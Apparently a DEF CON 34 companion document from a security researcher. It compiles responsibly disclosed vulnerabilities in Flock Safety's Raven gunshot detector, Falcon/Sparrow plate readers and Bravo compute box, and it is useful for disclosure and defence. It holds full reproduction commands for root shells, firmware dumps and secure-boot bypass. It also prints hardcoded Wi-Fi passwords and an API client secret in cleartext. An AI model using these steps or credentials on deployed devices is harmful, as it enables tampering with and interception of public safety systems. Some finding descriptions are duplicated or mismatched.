---
title: "Bird Hunting Season The Final Flight"
speakers: ["Jon Gaines"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - PDF v1.pdf"
pages: 47
sha256: "eeba7a3e2affd75e4f25d11c06c53dc05dda7bf2d5ad8a52450d37edb47eed33"
text_chars: 94180
ocr_pages: 0
has_ocr: false
redacted_secrets: 1
ocr_confidence: null
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T06:36:12Z"
---
# Bird Hunting Season The Final Flight

**Speakers:** Jon Gaines  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Jon Gaines - Bird Hunting Season The Final Flight - PDF v1.pdf` (47 pages)


## Slide 1

# Bird Hunting Season: The Final Flight

Jon "GainSec" Gaines

What this is. This is the companion PDF to my DEF CON 2026 lecture, Bird Hunting Season: The Final Flight. It's all of the issues that have gone through the responsible disclosure timeline and have been published, most close to a year ago, on my site and in my white paper, Examining the Security Posture of an Anti-Crime Ecosystem (DOI

- 10.5281/zenodo.17529424). The issues covered in the white paper and my lecture are all here, in cleartext. I didn't include any screenshots, so if you want screenshots, more

information, and some of my commentary, read the original disclosures on the site. You can identify them by the Full Disclosure tag, as explained in the How to read a finding section. I've listed them all below as well.

To read the original disclosures - with the pictures, the extra info, and the full step-by-step - check them out:

- Part 1 - Bird Hunting Season: Security Research on Flock Safety's Anti-Crime Systems

- Part 2 - Plucked and Rooted - Device 1: Debug Shell on the Raven Gunshot Detection System

- Part 3 - Grounded Flight - Device 2: Root Shell on the Falcon/Sparrow License Plate Reader

- Part 4 - Trap Shooter - a tiny Flock Safety sniffer & alarm

- Part 5 - Root from the Coop - Device 3: Root Shell on the Bravo Compute Box

- Part 6 - Fly-By - Device 2: Gated Wireless RCE, Camera Feed, DoS, Information Disclosure and More

- Part 7 - Button Presses to Wireless RCE: A Shell on the License Plate Cameras Over Wi-Fi

- Part 8 - Formalizing my Flock Safety Security Research

- Part 9 - BirdEye - a tool to test Flock Safety's ML visual recognition models

- Part 10 - Live Camera Feeds & Debug Web Interfaces Accidentally Exposed by Flock Safety

## How I got here

Every research project comes to a close. For about a year I bought Flock Safety hardware, took it apart, and published what I found while following responsible disclosure. This is where that run ends. Every finding sits in one place. The commands the white paper redacted are back in, as they've been unredacted on my blog this entire time. And the tools go out the door, so the work can carry on without me. Call it the capstone, call it the hand-off - both fit.

## Slide 2

What I found across three devices and a shared Android app suite wasn't one clever bug. It was a posture: secure boot off, bootloaders unlocked, debug interfaces wide open, firmware in cleartext, credentials hardcoded, and - the one that still gets me - a wireless path to a shell that needs no root, no soldering, and no firmware mods at all. Just a shared hotspot password and an admin API that forgot to ask who you are.

A heads-up before the findings: a lot of these still have no CVE number. Some are still pending assignment - a few for the better part of a year. A handful I took to DHS and CISA instead, and those have sat just as long. I've stepped away from chasing any of them further; I cover why in the lecture. So when a finding has no CVE attached - especially one the white paper still marks pending - that's the reason. The issue is real and disclosed. It just never got its number.

It's been a while since I disposed of my Flock hardware. This research project was really interesting and fun, but it also had some unintended consequences - negative and positive ones. I look forward to the community continuing this good-faith security research, and I hope my contribution proves valuable.

## Slide 3

## Brief Timeline

|Date|Milestone|
|---|---|
|02/08/25|Initial contact withFlockSafety|
|02/10/25|First response fromFlockSafety|
|03/07/25|Flock submits 10 vulnerabilities toMITREforCVEassignment|
|05/05/25|Flock
GunshotDetection &LicensePlateReaderSecurityAlert|
|06/19/25|Public disclosure -Part 1:BirdHuntingSeason,Part 2:Plucked andRooted (Raven),
Part 3:GroundedFlight (Falcon/Sparrow root)|
|06/27/25|First batch ofCVEs published; further issues disclosed toFlock|
|06/30/25|Part 4: TrapShooter released|
|09/19/25|Part 5:Root from theCoop -BravoComputeBox root shell|
|09/27/25|Part 6:Fly-By - gated wirelessRCE&Part 7:ButtonPresses to WirelessRCE|
|10/23/25|Further vulnerabilities disclosed to the vendor|
|11/05/25|Part 8:Formalizing the research - formal white paper published (45 → 51 issues)|
|11/06/25|Flock
Response toCompiledSecurityResearch onFlockSafetyDevices|
|11/12/25|Part 9:BirdEye released|
|11/26/25|Conversation withDHS&CISAbegins|
|12/23/25|Flock
Update onLimitedCondorDeviceConfigurationIssue|
|01/06/26|Flock
HasFlockBeenHacked?|
|01/09/26|The exposed-feeds disclosure (external contributor) - live camera feeds & debug
interfaces|
|02/11/26|FullDisclosurePart 5 -SpeedPourer /FRP/ media pipeline|
|03/27/26|Flock
FlockSafetyCybersecurity:How WeProtectCustomer &CommunityData|
|08/08/2026|BirdShot released,ResearchProject handed off.|

## How to read a finding

Each finding gets a colored bar with the essentials: severity, CVE (if it has one), CVSS, CWE, when it was disclosed, and who found it. Then, in plain terms: what it is, why it matters, how to reproduce it (with the actual commands), and, where I have it, the evidence straight off the

## Slide 4

unit. Severities and CVE numbers are as tracked in the working white paper. Where a finding shows a CVE it's clickable - it links straight to the CVE record. Findings with no CVE pill either were folded into an existing CVE by the vendor or never got an assignment; I've stopped showing those as "pending," since realistically the ones still outstanding aren't coming.

Every finding also carries a teal FULL DISCLOSURE ↗ pill. That's a link to the original GainSec write-up this finding came from - the part of the Bird Hunting Season series where it was first disclosed. The summaries here are deliberately tight; the linked posts go much deeper, with the full narrative, the complete command output, and the photos of the actual hardware, wiring, boot logs, and shells that don't fit on a card. If you want to see the firmware dump, the UART/EDL wiring, or the root shell being taken step by step, that's where it lives. Findings on the same device point at the same post (e.g. all the Raven findings link the Raven teardown), so it doubles as a jump to that device's full story. Pills open in a new tab.

A few findings also carry a purple ◎ BIRDSHOT pill in the bar. That marks a finding that BirdShot - the released toolkit described at the end of this document - automates or exercises directly, whether that's joining the hotspot, hitting the unauthenticated admin API, enabling ADB, dropping the wireless shell, or replaying the on-device ML models. Hover the pill to see which module covers it. It's the same research, turned into a repeatable, authorized-testing workflow that a defender can run against their own units.

The findings are grouped by device, in the order they were found - the three pieces of hardware first, then the shared app suite and the wireless chain, then the public apps, and finally the two community-contributed findings. The very last one - the exposed camera feeds - isn't written up as a formal finding at all. It got its own story, at the end, because it deserves one.

Just want the shells? If you're here for the money shot - getting a shell or root on each device - jump straight to these findings. Each one has the full command sequence inline; the teal Full Disclosure link on each row is the original GainSec write-up for that device, with the wiring photos and full walkthrough.

- Raven (Gunshot Detection) - debug/UART shell: Finding 2 (re-enable the UART console); dump the firmware in cleartext: Finding 5. Physical access FULL DISCLOSURE ↗

- Falcon / Sparrow / Flex LPR - root shell: Finding 12 (Magisk + EDL). Physical access FULL DISCLOSURE ↗

- Picard / Bravo Compute Box - root shell: Finding 21 (null AVB + EDL firehose + Magisk). Physical access FULL DISCLOSURE ↗

- LPR & Compute Box - no screwdriver, over Wi-Fi - the wireless chain: trigger the hotspot (Finding 29) → abuse the unauthenticated admin API (Finding 28) → shell (Finding 33), system (Finding 30), or root (Finding 41). Wireless FULL DISCLOSURE: FLY-BY ↗

- FULL DISCLOSURE: BUTTON PRESSES ↗

## Slide 5

### Device 1 - The Raven (Gunshot Detection)

Flock's audio gunshot detector. A Syntiant NDP120-B0 neural chip for the listening, an ESP32-D0WD doing the rest. Model v1.2 · Package 1.9.7 · Firmware 76.3.0. Physical access, a UART adapter, and a Bus Pirate get you everywhere.

#### Finding 1 - Secure Boot is Disabled

CRITICAL `CVE-2025-47819` CVSS 9.8 CWE-1326 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to have 'Secure Boot' disabled. Secure Boot is a security feature that ensures only trusted software runs during the devices startup process.

Affected: Raven Gunshot Detection

Why it matters. Disabling Secure Boot allows unsigned or malicious bootloaders and kernel-level code to execute during system startup, undermining the trust chain and enabling persistent compromise at the firmware or OS level. This exposes the host to rootkits and pre-boot tampering undetectable by standard security controls.

##### How to reproduce it

1. Open the case; connect probes at the `UART` pad and attach a TTL/UART adapter.

2. Dump the eFuse settings/values with `espefuse summary` .

3. Note `ABS_DONE_0 (BLOCK0) Secure boot V1 ... = False R/W (0b0)` and `ABS_DONE_1 (BLOCK0) Secure boot V2 ... = False R/W (0b0)` .

4. Confirm UART Download Mode support with a second `espefuse` read.

\```
python -m espefuse --port COM13 summary
python -m espefuse --port COM13 dump
\```

##### Evidence (from the unit)

\```
BLOCK2 (secure_boot_v1 s) [2 ] read_regs: 00000000 00000000 00000000 00000000 00000000 00000000
00000000 00000000 BLOCK2 (BLOCK2) Security boot key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 R/W
\```

Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.

#### Finding 2 - Debug (UART) Console Access

`CVE-2025-47819` CVSS 8.7 CWE-1191 Disclosed 6/19/2025 FULL DISCLOSURE ↗

CRITICAL

## Slide 6

What it is. The Raven gunshot detection system was found to have debug (UART) console access disabled. However, it can be reenabled via a single byte modification of its NVS' partition. This results in control of the device via a 'shell.'

##### Affected: Raven Gunshot Detection

Why it matters. An attacker can leverage this access to run debug commands, view firmware logs and other functionalities

##### How to reproduce it

1. Open case; attach TTL/UART adapter to the `UART` pad.

2. View the `espefuse` summary and note `CONSOLE_DEBUG_DISABLE (BLOCK0) Disable ROM BASIC interpreter fallback = True R/W (0b1)` .

3. Hold `IO0` and `EN` pads down; power on and let `EN` float to enter `DOWNLOAD_BOOT` mode.

4. Dump the `NVS` partition, convert to CSV, set `ConsoleLogEn` from 0 to 1, regenerate the NVS image, and flash it back.

5. Reboot - UART console access is now available.

\```
python -m espefuse --port COM13 summary
python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
./nvs2cvs.py -t=cvs FlockSafety/Raven-Gunshot/nvs.bin >> FlockSafety/Raven-Gunshot/nvs-csv.csv
python /esp-idf/components/nvs_flash/nvs_partition_generator/nvs_partition_gen.py generate nvs-
modified.csv nvs_modified.bin 0x4000
python -m esptool --port COM13 --chip esp32 write_flash 0x9000 nvs_modified.bin
\```

##### Evidence (from the unit)

\```
CONSOLE_DEBUG_DISABLE (BLOCK0) Disable ROM BASIC interpreter fallback
= True R/W (0b1)
\```

Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.

#### Finding 3 - Lack of Password on Debug (UART) Console Access

CRITICAL `CVE-2025-47819` CVSS 8.7 CWE-1191 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to lack a debug (UART) console access password.

Affected: Raven Gunshot Detection

Why it matters. An attacker can leverage this access to run debug commands, view firmware logs and other functionalities.

##### How to reproduce it

1. Follow Finding 2 to enable the UART console.

## Slide 7

2. Reboot and note the console requires no authentication (no password prompt/banner).

\```
python -m espefuse --port COM13 summary
\```

\```
# NVS dump / convert / regenerate / flash chain identical to Finding 2
\```

Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE assignment request.

#### Finding 4 - Hardcoded Wi-Fi Credentials Auto-Connect

◎ BIRDSHOT HIGH `CVE-2025-47818` CVSS 7.2 CWE-259 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to store cleartext SSID & Password within its firmware. The device automatically connects to this SSID if the LTE modem is unavailable/not configured.

Affected: Raven Gunshot Detection

Why it matters. An attacker can leverage this to obtain a person-in-the-middle (PiTM) position, allowing intercepting of the devices network traffic.

##### How to reproduce it

1. Enter `DOWNLOAD_BOOT` mode: hold `IO0` and `EN` pads down, power on, let `EN` float.

2. Dump the firmware and grep for the vendor string to reveal SSIDs and passphrases.

3. Or carve/dump the `NVS` partition and read the `sta.apinfo` blob directly.

4. Stand up an AP with SSID `Flock` or `Flock-230503` and the recovered passphrase; boot the unit with LTE unplugged and observe auto-connect.

\```
python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
strings firmware_dump.bin | grep 'Flock'
./esp32knife.py --chip auto load_from_file firmware_dump.bin
python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
\```

- Passphrase for SSID `Flock` : `Ay4TwnB43fmx`

- Passphrase for SSID `Flock-230503` : `security` (the default Host AP `Flock-230503` /

- password `security` )

##### Evidence (from the unit)

\```
I (116066) WIFI: Preferred SSID not set. Using flockApList. I (116072) WIFI: Connecting to SSID
Flock I (116088) WIFI: wifi_start finished. I (116093) NET_INT: Network connect to wifi
returned ok
\```

Note: This finding was improperly included in CVE-2025-47818 instead of being given its own CVE # when the Vendor submitted the CVE assignment request.

## Slide 8

#### Finding 5 - Lack of Flash Encryption

HIGH `CVE-2025-47820` CVSS 7.2 CWE-312 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to lack flash encryption. This enables an attacker with physical access the ability to read or dump the device's firmware in cleartext.

Affected: Raven Gunshot Detection

Why it matters. An attacker with physical access can read or dump the devices firmware

How to reproduce it

1. Enter `DOWNLOAD_BOOT` ( `IO0` + `EN` , let `EN` float).

2. Dump the firmware and confirm cleartext via `strings` .

3. Alternatively read the `espefuse` summary and note `BLOCK1` is all zeros and `FLASH_CRYPT_CNT` =0.

\```
python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
strings firmware_dump.bin | grep -Eo 'http[s]?://[^ ]+'
python -m espefuse --port COM13 summary
\```

##### Evidence (from the unit)

\```
Flash fuses: FLASH_CRYPT_CNT (BLOCK0) = 0 R/W (0b0000000) FLASH_CRYPT_CONFIG (BLOCK0) = 0 R/W
(0x0) BLOCK1 (BLOCK1) Flash encryption key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W DISABLE_DL_ENCRYPT (BLOCK0) = False R/W (0b0)
DISABLE_DL_DECRYPT (BLOCK0) = False R/W (0b0
\```

#### Finding 6 - Debug Interface Accessible (JTAG)

What it is. The Raven gunshot detection system was found to have JTAG enabled. This enables an attacker with physical access to access this debug interface.

Affected: Raven Gunshot Detection

Why it matters. An attacker with physical access can interface with the JTAG interface which can result in the following: unauthorized access, firmware extraction, and potential code manipulation. This could lead to intellectual property theft, device cloning, or attackers bypassing security protections.

##### How to reproduce it

1. Attach TTL/UART adapter to the `UART` pad.

2. Read the `espefuse` summary and note `JTAG_DISABLE (BLOCK0) Disable JTAG = False R/W (0b0)` .

## Slide 9

\```
python -m espefuse --port COM13 summary
\```

##### Evidence (from the unit)

\```
Flash fuses: FLASH_CRYPT_CNT (BLOCK0) = 0 R/W (0b0000000) FLASH_CRYPT_CONFIG (BLOCK0) = 0 R/W
(0x0) BLOCK1 (BLOCK1) Flash encryption key= 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 R/W DISABLE_DL_ENCRYPT (BLOCK0) = False R/W (0b0)
DISABLE_DL_DECRYPT (BLOCK0) = False R/W (0b0
\```

#### Finding 7 - Debug Interface Accessible (UART Download)

MEDIUM `CVE-2025-47819` CVSS 5.3 CWE-1299 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to have JTAG enabled. This enables an attacker with physical access to access this debug interface.

Affected: Raven Gunshot Detection

Why it matters. An attacker with physical access can interface with the JTAG interface which can result in the following: unauthorized access, firmware extraction, and potential code manipulation. This could lead to intellectual property theft, device cloning, or attackers bypassing security protections.

##### How to reproduce it

1. Enter `DOWNLOAD_BOOT` mode ( `IO0` + `EN` , let `EN` float) - banner shows `boot:0x3 (DOWNLOAD_BOOT(...))` / `waiting for download` .

2. Confirm via `espefuse` that `UART_DOWNLOAD_DIS (BLOCK0)` = False.

\```
python -m espefuse --port COM13 summary
\```

##### Evidence (from the unit)

\```
UART_DOWNLOAD_DIS (BLOCK0)
= False R/W (0b0)
\```

Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE number assignment request.

#### Finding 8 - No Anti-Rollback Protection

MEDIUM CVSS 5.3 CWE-1299 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to have 'Rollback Protection' disabled. Rollback protection is a security feature that prevents a system from being reverted to

## Slide 10

an earlier, potentially vulnerable version of its firmware.

Affected: Raven Gunshot Detection

Why it matters. An attacker with physical access can install older and vulnerable firmware onto the device.

##### How to reproduce it

1. Read the `espefuse` summary and note `SECURE_VERSION (BLOCK3) Secure version for anti-rollback = 0` .

\```
python -m espefuse --port COM13 summary
\```

##### Evidence (from the unit)

\```
SECURE_VERSION (BLOCK3) Secure version for anti-rollback = 0 R/W (0x00000000)
\```

Note: This finding was improperly included in CVE-2025-47819 instead of being given its own CVE number when the Vendor submitted the CVE number assignment request.

#### Finding 9 - Audio ML/AI Model Disclosed

What it is. The Raven gunshot detection system was found to lack flash encryption. This resulted in the devices gunshot recognition model to be accessible.

Affected: Raven Gunshot Detection

Why it matters. Plaintext AI/ML binaries let any local or remote foothold copy, reverse, or tamper with inference logic, enabling model plagiarism, rapid bypass of decision thresholds, targeted poisoning of detections, and seamless chaining into the already-documented vulnerabilities.

##### How to reproduce it

1. Enter `DOWNLOAD_BOOT` and dump the firmware.

2. Carve the audio model region out of the dump and save as `audio_model.bin` .

3. Confirm validity by checking for Syntiant file signatures with `file` / `strings` .

\```
python -m esptool --chip esp32 --port COM13 read_flash 0x00000 0x1000000 firmware_dump.bin
./esp32knife.py --chip auto load_from_file firmware_dump.bin   # carve model region
file audio_model.bin
\```

Note: This finding is a affect of Finding 5.

## Slide 11

FULL DISCLOSURE ↗

#### Finding 10 - Hardcoded Credentials - API Client Secret

LOW `CVE-2025-47821`

CVSS 2.3 CWE-259 Disclosed 6/19/2025

What it is. The Raven gunshot detection system was found to store cleartext API client ID and client secret in cleartext.

Affected: Raven Gunshot Detection

Why it matters. An attacker can leverage these API credentials to flood, access or otherwise compromise the devices Cloud API.

How to reproduce it

1. Enter `DOWNLOAD_BOOT` , dump the `NVS` partition, convert to CSV.

2. Read the `clientId` and `clientSecret` values from the CSV.

3. Device log confirms the deprecated hardcoded path: `HPNOTIQ_HELP: Failed to`

`authenticate through auth0 ... falling back to hardcoded api key` .

\```
python -m esptool --chip esp32 --port COM13 read_flash 0x9000 0x4000 nvs.bin
./nvs2cvs.py -t=cvs nvs.bin >> nvs-csv.csv
\```

`clientId` : `xvtgsytnYyrs7pk88Q4vLQSbBRCu38GW`

`clientSecret` : `BcyZHIz-D49AqQsW83hKdYvXv7W3p8jzc_wluP_cAP5cBmP3mQhNytTEz8BPwm9k`

##### Evidence (from the unit)

\```
clientId data string xvtgsytnYyrs7pk88Q4vLQSbBRCu38GW clientSecret data string BcyZHIz-
D49AqQsW83hKdYvXv7W3p8jzc_wluP_cAP5cBmP3mQhNytTEz8BPwm9k
\```

#### Finding 11 - Lack of Server Verification (DNS Spoofing)

INFORMATIONAL CVSS 2.3 CWE-295 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Raven gunshot detection system was found to store cleartext API client ID and client secret in cleartext.

Affected: Raven Gunshot Detection

Why it matters. An attacker on the same W/LAN can intercept encrypted communications via DNS spoofing.

How to reproduce it

1. On the same W/LAN, run `DNSChef` + a MITM router (GainSec-in-the-Middle GITM ↗ ) and point the two subdomains at your own server.

2. Intercept and view the traffic with `IONinja` ; note the client does not validate the server before connecting.

##### Evidence (from the unit)

## Slide 12

\```
The following subdomains were susceptible: device-login.flocksafety.com hpnotiq.flocksafety.com
\```

Note: This finding requires further research.

### Device 2 - The Falcon / Sparrow / Flex LPR

The pole-mounted license-plate readers you actually see on the roads. An OpenQ 624A (Qualcomm MSM8953) running Android 8.1.0. Unlocked bootloader and secure boot off, straight out of the box.

#### Finding 12 - Root Shell

CRITICAL CVSS 9.8 CWE-306 Disclosed 6/19/2025 FULL DISCLOSURE ↗ FIREHOSE ↗

What it is. The Falcon/Sparrow/Flex* LPR failed to prevent a root shell from being achieved. Root access results in complete device compromise.

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An attacker with physical access can get root access to the device.

How to reproduce it

1. Download Magisk v23; unzip and copy the device's stock `boot.img` into the Magisk directory.

2. Flip the dip switch off, power on, flip the dip switch on, connect USB; push the Magisk directory to the device.

3. `adb shell` in; move the 32-bit magisk binaries removing `.so` , `chmod` them executable.

4. `chmod` and run `boot_patch.sh` to patch the stock `boot.img` ; pull the patched image.

5. Reboot to EDL and flash the patched image; regain `adb` .

6. Uninstall the auto-installed Magisk APK, install the proper v23 APK, mirror with `scrcpy` , grant su on first `su` .

7. Set SELinux to permissive.

\```
adb push magisk/ /data/local/tmp/
adb shell chmod +x boot_patch.sh && ./boot_patch.sh boot.img
adb pull /data/local/tmp/new-boot.img
\```

#### Finding 13 - Secure Boot is Disabled

CVSS 9.8 CWE-1104 Disclosed 6/19/2025

CRITICAL

\```
CVE-2025-47822
\```

FULL DISCLOSURE ↗

## Slide 13

What it is. The Falcon/Sparrow/Flex* LPR was found to have 'Secure Boot' disabled. Secure Boot is a security feature that ensures only trusted software runs during the device's startup process. Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. Disabling Secure Boot allows unsigned or malicious bootloaders and kernel-level code to execute during system startup, undermining the trust chain and enabling persistent compromise at the firmware or OS level. This exposes the host to rootkits and pre-boot tampering undetectable by standard security controls.

##### How to reproduce it

1. Open case; dip switch off; hold volume-down and power on; dip switch on; connect microUSB → device in `fastboot` .

2. Read variables and note `secure:no` .

3. Alternatively enter EDL (Force USB button) and confirm via the edl secureboot check - output prints `Secure boot disabled.` (Sahara/Firehose V3.62).

\```
adb reboot fastboot
fastboot getvar all        # note secure: no
./edl secureboot --loader=ALPR_DDR_Firehose.mbn
\```

#### Finding 14 - Unlocked Bootloader

CRITICAL `CVE-2025-47822` CVSS 9.8 CWE-1299 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR Bootloader was found to be unlocked allowing unauthorized firmware to be installed.

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An unlocked bootloader permits arbitrary unsigned firmware to be installed and executed on the device, effectively bypassing the device's root of trust. This yields full compromise of the device's security properties.

##### How to reproduce it

1. Enter fastboot (dip switch off → volume-down + power → dip switch on → USB).

2. Read variables and note `unlocked:yes` .

\```
adb reboot fastboot
fastboot getvar all        # note unlocked: yes
\```

## Slide 14

FULL DISCLOSURE ↗

#### Finding 15 - Lack of Authentication: EDL/QDL Mode

CRITICAL `CVE-2025-47822` CVSS 9.8 CWE-1299 Disclosed 6/19/2025 FIREHOSE ↗

What it is. The Falcon/Sparrow/Flex* LPR EDL/QDL mode was found to lack any type of authentication or access control.

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. Attackers can exploit publicly known vulnerabilities that remain unpatched, enabling privilege escalation, remote code execution, or denial-of-service. Continued operation on an obsolete platform increases overall attack surface and compromises system integrity, confidentiality, and availability.

How to reproduce it

1. Enter EDL (Force USB button on power-on), connect micro-USB.

2. Note the stock/public firehose loader is accepted with no authentication. The Falcon/Sparrow ALPR firehose ( `ALPR_DDR_Firehose.mbn` ) is published at GainSec/flock-safety-falconsparrow-alpr-edl-firehose.

\```
./edl printgpt --loader=ALPR_DDR_Firehose.mbn
\```

Note: This finding was improperly included with CVE-2025-47822 instead of being given its own CVE # when the Vendor submitted the CVE assignment request.

#### Finding 16 - Lack of Authentication - Android Debug Bridge

◎ BIRDSHOT CRITICAL `CVE-2025-47823` CVSS 8.8 CWE-287 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR is configured to not require authentication (approval) when accessing the device via Android Debug Bridge (ADB).

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An attacker with physical access can get 'shell' access to the device.

How to reproduce it

1. Dip switch off → power on → dip switch on → connect USB.

2. `adb shell` in - developer options not required, no on-device approval prompt, no preconfigured ADB server keys.

\```
adb shell
\```

## Slide 15

FULL DISCLOSURE ↗

#### Finding 17 - Improper Access Control - ADB Sideload

CRITICAL `CVE-2025-47823` CVSS 8.8 CWE-284 Disclosed 6/19/2025

What it is. The Falcon/Sparrow/Flex* LPR is configured to allow sideloading apps via ADB. Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An attacker with physical access can install whatever application they want onto the device.

How to reproduce it

1. With unauthenticated `adb` , sideload an arbitrary APK and note success.

\```
adb install example.apk
\```

#### Finding 18 - Lack of Flash/eMMC Encryption

CRITICAL `CVE-2025-47824` CVSS 5.2 CWE-312 Disclosed 6/19/2025 FULL DISCLOSURE ↗

FIREHOSE ↗

What it is. The Falcon/Sparrow/Flex* LPR was found to lack flash/EMMC encryption. This encryption ensures that if the firmware is dumped from the device, it is unreadable

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An attacker with physical access can read or dump the device's firmware in cleartext.

How to reproduce it

1. Enter EDL (Force USB button / EDL cable).

2. Dump the eMMC firmware and confirm cleartext via `strings` .

3. Optionally mount a partition image with `debugfs` and browse its contents.

\```
./edl rf alpr_emmc_firmware.bin --memory=emmc --loader=ALPR_DDR_Firehose.mbn
debugfs system.img
debugfs:  ls
\```

#### Finding 19 - Unsupported End-of-Life Operating System

HIGH CVSS 5.3 CWE-1104 Disclosed 6/19/2025 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR was found to run Android 8.1.0, an OS that reached its end-of-life (EOL) in 2022. Post-EOL, the vendor ceases delivering security updates, leaving the system exposed to known and emerging vulnerabilities. Using unsupported software in

## Slide 16

production violates secure lifecycle management principles and undermines compliance with most cybersecurity baselines (e.g., CIS Controls, NIST 800-53 SI-2). Devices on deprecated OS versions are more susceptible to exploitation, as vulnerabilities remain unpatched and publicly documented exploit code often exists.

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. Attackers can exploit publicly known vulnerabilities that remain unpatched, enabling privilege escalation, remote code execution, or denial-of-service. Continued operation on an obsolete platform increases overall attack surface and compromises system integrity, confidentiality, and availability.

##### How to reproduce it

1. Boot the device, connect `adb` , and read the build props with `getprop` - note Android 8.1.0 (EOL).

\```
adb shell getprop ro.build.version.release
adb shell getprop ro.build.fingerprint
\```

#### Finding 20 - Development/Test Credential in Production

LOW `CVE-2025-59409` CVSS 3.5 CWE-1299 Disclosed 9/27/2025 FULL DISCLOSURE ↗

What it is. One of the Falcon/Sparrow/Flex* LPR units was found to contain development/test credentials in clear text. In this case, this was for the 'test_flck' Wi-Fi network. It was found that if the wireless interface was brought up or if the modem could not connect, the device would automatically connect to any AP with that name and password.

Affected: Falcon/Sparrow/Flex* License Plate Readers

Why it matters. An attacker with physical or local access can steal this password. Additionally, an attacker cam set up a malicious AP (evil twin) positioning themselves a 'person-in-the-middle' PiTM when the device auto connects too when its Wi-Fi is enabled.

##### How to reproduce it

1. With `adb` / `cat` , read the Wi-Fi configuration and note the dev/test network `test_flck` provisioned in production.

2. (Original whitepaper references a screenshot as evidence.)

SSID `test_flck` · password `curlysquash524` (or, on some units, just `Flock` )

Note: Used in an attack chain with Findings such as 29 or 30, this finding's severity would greatly increase.

## Slide 17

### Device 3 - The Picard / Bravo Compute Box

The edge-AI brain. A ThunderComm TurboX QCS6490 running Android 13 over UFS. Two USB-C ports, an easily-nulled AVB, and the same unlocked-and-unsigned story as everything else.

#### Finding 21 - Root Shell

CRITICAL CVSS 9.8 CWE-306 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Compute Box failed to prevent a root shell from being achieved. Root access results in complete device compromise

Affected: Picard/Bravo Compute Box

Why it matters. An attacker with physical access can get root access to the device.

How to reproduce it

1. Null out AVB: generate a custom `vbmeta_a` with `avbtool` following the proper boot order.

2. Generate an empty `vbmeta_system_a` image.

3. Boot to EDL and write both partitions.

4. Install Magisk v29+ (sideload), push `boot_a` , patch it with Magisk via `scrcpy` , pull it.

5. Boot to EDL and flash the patched `boot_a` ; reboot.

6. Grant su on first `su` via `scrcpy` ; set SELinux permissive.

\```
python3 avbtool.py make_vbmeta_image --output custom_vbmeta_a.img \
  --include_descriptors_from_image boot_a.bin \
  --include_descriptors_from_image vendor_boot_a.bin \
  --include_descriptors_from_image dtbo_a.bin \
  --chain_partition vbmeta_system:2:dummy_key_4096.bin --algorithm NONE --flags 2
dd if=/dev/zero of=null_vbmeta_system_a.img bs=4096 count=1
./edl w vbmeta_a custom_vbmeta_a.img --lun=4 --memory=ufs --loader=prog_firehose_ddr.elf
./edl w vbmeta_system_a null_vbmeta_system_a.img --lun=0 --memory=ufs --
loader=prog_firehose_ddr.elf
./edl w boot_a magisk_patched-29000.img --lun=4 --memory=ufs --loader=prog_firehose_ddr.elf
\```

#### Finding 22 - Secure Boot is Disabled

CRITICAL `CVE-2025-59408` CVSS 9.8 CWE-1326 Disclosed 9/19/2025 FULL DISCLOSURE ↗

What it is. The Picard/Bravo Compute Box was found to have 'Secure Boot' disabled. Secure Boot is a security feature that ensures only trusted software runs during the device's startup process.

Affected: Picard/Bravo Compute Box

## Slide 18

Why it matters. Disabling Secure Boot allows unsigned or malicious bootloaders and kernel-level code to execute during system startup, undermining the trust chain and enabling persistent compromise at the firmware or OS level. This exposes the host to rootkits and pre-boot tampering undetectable by standard security controls.

How to reproduce it

1. Plug into the black USB-C port and press the button to power on.

2. When the blue light appears, boot to fastboot via `adb` and read variables; note `secure:no` .

\```
adb reboot bootloader
fastboot getvar all        # note secure: no
\```

##### Evidence (from the unit)

\```
(bootloader) secure:no
\```

#### Finding 23 - Unlocked Bootloader

